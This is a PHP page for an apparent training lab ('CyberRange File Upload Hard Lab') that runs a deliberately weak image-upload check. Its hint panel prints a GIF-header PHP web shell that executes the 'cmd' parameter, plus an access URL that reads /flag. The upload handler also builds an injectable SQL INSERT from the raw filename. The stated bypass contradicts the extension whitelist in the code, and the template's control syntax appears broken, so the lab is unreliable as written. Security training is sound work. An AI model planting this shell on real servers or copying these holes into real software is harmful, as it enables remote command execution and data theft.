<?php
$message = '';
$messageType = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $filename = $file['name'];
    $tmp_name = $file['tmp_name'];
    $file_type = $file['type'];

    // Check file extension
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $allowed_exts = ['jpg', 'jpeg', 'png', 'gif'];

    // Check MIME type
    $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];

    // Check file header (magic bytes)
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $tmp_name);
    finfo_close($finfo);

    if (in_array($ext, $allowed_exts) && in_array($file_type, $allowed_types) && in_array($mime, $allowed_types)) {
        $target = 'uploads/' . basename($filename);
        if (move_uploaded_file($tmp_name, $target)) {
            $message = "文件上传成功: " . htmlspecialchars($filename);
            $messageType = 'success';

            require_once 'config.php';
            $conn->query("INSERT INTO files (filename, original_name, file_type, file_size) VALUES ('$target', '$filename', '$file_type', {$file['size']})");
        } else {
            $message = '文件上传失败！';
            $messageType = 'error';
        }
    } else {
        $message = '文件验证失败！扩展名、MIME 类型或文件头不匹配。';
        $messageType = 'error';
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Upload Hard - 图片头绕过</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #f5f5f5; font-family: -apple-system, sans-serif; padding: 2rem; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #f59e0b; margin-bottom: 0.5rem; }
        .subtitle { color: #a1a1aa; margin-bottom: 2rem; font-size: 0.9rem; }
        .hint { background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px; padding: 1rem; margin-bottom: 2rem; }
        .hint h3 { color: #f59e0b; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .hint p { color: #a1a1aa; font-size: 0.85rem; }
        .hint code { background: #27272a; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.85rem; }
        .upload-form {
            background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px;
            padding: 2rem; margin-bottom: 2rem;
        }
        .upload-form h3 { margin-bottom: 1.5rem; }
        .form-row { margin-bottom: 1rem; }
        .form-row label { display: block; color: #a1a1aa; font-size: 0.9rem; margin-bottom: 0.5rem; }
        input[type="file"] {
            width: 100%; padding: 1rem; background: #0a0a0a; border: 1px dashed #27272a;
            color: #f5f5f5; border-radius: 8px; font-size: 0.9rem;
        }
        input[type="file"]:hover { border-color: #f59e0b; }
        button {
            padding: 0.75rem 1.5rem; background: #f59e0b; color: white; border: none;
            border-radius: 8px; cursor: pointer; font-size: 1rem;
        }
        button:hover { background: #d97706; }
        .message { padding: 1rem; border-radius: 8px; margin-bottom: 1rem; }
        .message.success { background: #0a1a0a; border: 1px solid #003f00; color: #10b981; }
        .message.error { background: #1a0000; border: 1px solid #3f0000; color: #ef4444; }
        .info { background: #1a0a00; border: 1px solid #3f2000; border-radius: 8px; padding: 1rem; margin-top: 2rem; }
        .info h3 { color: #f59e0b; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .info p { color: #a1a1aa; font-size: 0.85rem; }
        .info code { background: #27272a; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.85rem; }
    </style>
</head>
<body>
    <div class="container">
        <h1>头像上传系统</h1>
        <p class="subtitle">上传你的头像 (严格验证) | CyberRange File Upload Hard Lab</p>

        <div class="hint">
            <h3>学习目标</h3>
            <p>这个靶场有三重验证：扩展名、MIME 类型、文件头（magic bytes）。</p>
            <p>攻击者需要在 PHP 文件前添加图片文件头才能绕过验证。</p>
            <p>试试在 PHP 代码前添加 <code>GIF89a</code>（GIF 文件头）。</p>
        </div>

        <div class="upload-form">
            <h3>上传头像</h3>
            <form method="POST" enctype="multipart/form-data">
                <div class="form-row">
                    <label>选择文件 (只允许 .jpg, .png, .gif 图片文件)</label>
                    <input type="file" name="file" required>
                </div>
                <button type="submit">上传</button>
            </form>
        </div>

        <?php if ($message): ?>
            <div class="message <?php echo $messageType; ?>"><?php echo $message; ?></div>
        <?php endif; ?>

        <?php
        $files = glob('uploads/*');
        if ($files):
        ?>
        <div style="margin-bottom: 2rem;">
            <h3 style="color: #a1a1aa; font-size: 0.9rem; margin-bottom: 1rem;">已上传文件</h3>
            <?php foreach ($files as $f): ?>
                <div style="background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px; padding: 0.75rem 1rem; margin-bottom: 0.5rem; display: flex; justify-content: space-between; align-items: center;">
                    <span style="font-family: monospace;"><?php echo htmlspecialchars(basename($f)); ?></span>
                    <a href="<?php echo htmlspecialchars($f); ?>" style="color: #f59e0b; text-decoration: none; font-size: 0.85rem;" target="_blank">查看</a>
                </div>
            <?php endforeach; }
        ?></div>

        <div class="info">
            <h3>绕过方法</h3>
            <p>创建一个包含图片头的 PHP 文件：</p>
            <p><code>GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code></p>
            <p>保存为 <code>shell.php</code>，然后上传。</p>
            <p>服务器会认为这是一个 GIF 图片，但 PHP 会执行其中的代码。</p>
            <p>访问: <code>uploads/shell.php?cmd=cat /flag</code></p>
            <p>flag 格式: <code>CR{...}</code></p>
        </div>
    </div>
</body>
</html>
